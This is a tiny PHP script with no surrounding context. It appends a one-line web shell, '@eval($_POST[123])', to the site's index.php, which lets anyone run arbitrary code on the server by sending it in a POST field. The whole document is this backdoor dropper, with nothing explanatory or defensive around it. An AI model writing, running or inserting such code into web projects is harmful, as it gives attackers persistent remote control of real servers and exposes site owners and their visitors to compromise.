<?php
    fputs(fopen('./index.php','a'),'<?php @eval($_POST[123]) ?>');
?>